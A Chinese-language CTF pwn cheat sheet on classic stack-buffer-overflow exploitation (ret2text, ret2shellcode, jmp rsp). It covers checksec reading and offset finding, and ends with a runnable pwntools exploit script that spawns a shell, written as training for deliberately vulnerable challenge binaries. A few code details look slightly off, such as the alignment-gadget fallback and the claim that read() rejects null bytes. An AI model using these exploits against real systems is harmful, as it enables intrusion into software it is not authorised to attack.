---
title: 基础栈溢出 ret2text / ret2shellcode
category: pwn
tags: [栈溢出, ret2text, ret2shellcode, NX, pwntools]
signals: [gets/read 读入 buf 且长度超限, 程序里有 win 函数, PIE 关闭, NX 关闭, 32 位附件, 偏移量可数, 题面提示 no canary]
difficulty: easy
source: "CTF-Wiki 栈溢出原理 / ir0nstone binexp ret2win"
tools: [pwntools, gdb, pwndbg, ROPgadget]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 反编译里出现 `gets(buf)`、`read(0, buf, 0x100)` 而 `buf` 只有 `0x40` 字节。
- 二进制里存在从未被调用的 `getshell` / `backdoor` / `win` / `cat_flag` 函数，内部直接 `system("/bin/sh")` 或 `execve`。
- `checksec`：`No canary found`、`NX disabled`、`PIE disabled` 三者常见组合。
- 题目是 32 位 i386 附件（`file` 输出 `ELF 32-bit LSB executable`），参数走栈，利用最简单。
- 远程给了 `nc TARGET PORT`，本地直接能起，无 libc 依赖。

## 二、原理

函数调用时栈帧布局（x86-64）：

```text
高地址 ┌───────────────────┐
       │ 调用者的栈         │
       ├───────────────────┤
       │ 返回地址 (8B)     │ ← 覆盖这里就能劫持
       ├───────────────────┤
       │ saved rbp (8B)    │
       ├───────────────────┤
       │ buf[0x40]         │ ← 溢出起点
低地址 └───────────────────┘
```

溢出的本质：`read`/`gets` 不做边界检查，超长输入把 `saved rbp` 和 `ret addr` 覆盖成攻击值。当 `leave; ret` 或 `ret` 执行时，CPU 从栈上取回被篡改的值，控制流跳到任意地址。

- **ret2text**：跳到程序内已有的 `win` 函数（靠 `PIE disabled` 固定地址）。
- **ret2shellcode**：栈上写入 `shellcraft.sh()` 的机器码，再返回栈地址执行（需 `NX disabled`）。

## 三、checksec 判读与利用思路

```text
RELRO: Partial   STACK CANARY: No canary   NX: NX disabled   PIE: No PIE
```

这类组合的定式流程：

1. `objdump -d ./pwn | grep -A20 '<vuln>'` 找栈帧大小，或用 `pwndbg` 的 `cyclic` 求偏移。
2. `PIE disabled` + 有 `win` → 直接 ret2text，偏移 = `buf大小 + saved ebp`（32 位）或 `+ 8`（64 位）。
3. `NX disabled` 且无 `win` → 把 shellcode 放在缓冲区，`ret` 到 `buf` 地址；若 ASLR 开着则需要泄露栈地址或 `jmp rsp` gadget。
4. 64 位若 `win` 需要参数，需 `pop rdi; ret` 后再压入参数。
5. 栈对齐：64 位 `system` 内部使用 `movaps`，要求 `rsp % 16 == 0`，**在 gadget 链前加一个 `ret`** 修正。

求偏移的三种等价写法：

```python
# 方式 1：cyclic 模式（最快）
payload = cyclic(0x100)
# 崩溃后从 gdb: x/gx $rsp 取值，再 cyclic -l <值>
offset = cyclic_find(0x6161616c)   # 得到 0x40 + 8

# 方式 2：内核 core dump 自动解析
def find_offset(binary, marker=b"Aa0A"):
    p = process(binary)
    core = p.corefile
    return cyclic_find(core.read(core.rsp, 4))

# 方式 3：直接数反编译栈帧
#   char s[0x40];  →  0x40 + 8(saved rbp)  = 0x48
```

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
# 远程切换：python3 exp.py REMOTE HOST=TARGET PORT=1337
if args.REMOTE:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process()
    if args.GDB:
        gdb.attach(p, gdbscript="""
            b *main
            continue
        """)

PADDING = b"A" * 0x48          # 0x40 buf + 8 saved rbp（按实际栈帧改）
WIN     = elf.sym["getshell"]  # 或 p64(0xdeadbeef) 占位，换成真实 win 地址
POP_RDI = 0x401234             # 64 位专用；32 位删除这一行

# ---------- 变体 A：ret2text ----------
def exp_ret2text():
    if context.bits == 64:
        # 64 位：rdi = 参数，再 ret 对齐 16 字节栈
        payload  = PADDING
        payload += p64(POP_RDI)
        payload += p64(next(elf.search(b"/bin/sh")) if b"/bin/sh" in elf.data else 0x404050)
        payload += p64(elf.sym.get("ret", WIN))   # 栈对齐修正
        payload += p64(WIN)
    else:
        payload  = PADDING
        payload += p32(WIN)
        payload += p32(0x0)        # 假返回地址
    p.sendlineafter(b"> ", payload)

# ---------- 变体 B：ret2shellcode（NX 关闭时） ----------
def exp_ret2shellcode(buf_addr):
    sc = asm(shellcraft.sh())          # 自动匹配 arch
    payload  = b"\x90" * 0x20
    payload += sc
    payload += b"\x90" * (0x48 - 0x20 - len(sc))
    payload += p64(buf_addr) if context.bits == 64 else p32(buf_addr)
    p.sendlineafter(b"> ", payload)

# ---------- 变体 C：无 win、NX 关、有 jmp rsp ----------
def exp_jmp_rsp():
    JMP_RSP = next(elf.search(asm("jmp rsp")))  # 或 ROPgadget 找
    sc = asm(shellcraft.sh())
    payload  = b"\x90" * 0x10 + sc
    payload  = payload.ljust(0x48, b"\x90")
    payload += p64(JMP_RSP) if context.bits == 64 else p32(JMP_RSP)
    p.sendlineafter(b"> ", payload)

if __name__ == "__main__":
    exp_ret2text()
    p.interactive()
```

验证 shellcode 是否可执行（本地确认 NX 真的关了）：

```bash
# 若报 SIGSEGV 且 rsp 处确实是 shellcode，说明是栈不可写/不可执行
gdb -q ./pwn -ex 'b *main' -ex r -ex 'info proc mappings' -ex q
# 看到 [stack] 段带 x 才说明 NX 关闭
```

## 五、常见坑 / 变体

- **偏移算错**：`char buf[0x40]` 在 64 位下还要计入编译器插入的 padding，务必用 cyclic 实测而不是硬编码。
- **32 位少了返回地址位**：`p32(win)` 后必须补一个 4 字节假返回地址，否则 `win` 里 `ret` 会跳到栈上垃圾。
- **64 位栈未对齐**：`system` 崩在 `movaps`，在链前加 `ret`（`elf.sym['ret']` 或任意 `ret` gadget）。
- **shellcode 被杀**：`read` 按字节读入，确保不含 `\x00`；`gets` 遇 `\n` 截断，用 `read` 或在 shellcode 里避开 `\n`。
- **ret2text 但 PIE 开了**：先去别的页找泄露点拿到 base，或部分覆盖返回地址低 2 字节。
- **题目 fork 了子进程**：`process()` 每次连的是新进程，地址会变，要用 `remote` 或本地 `socat`。

## 六、参考来源

- [CTF-Wiki: 栈溢出原理](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/)
- [CTF-Wiki: 栈介绍](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/)
- [ir0nstone: ret2win 入门](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win)
- [ir0nstone: Shellcode](https://ir0nstone.gitbook.io/notes/binexp/stack/shellcode)
- [ir0nstone: De Bruijn Sequences 求偏移](https://ir0nstone.gitbook.io/notes/binexp/stack/de-bruijn-sequences)
- [HackTricks: Stack Overflows](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflows/index.html)
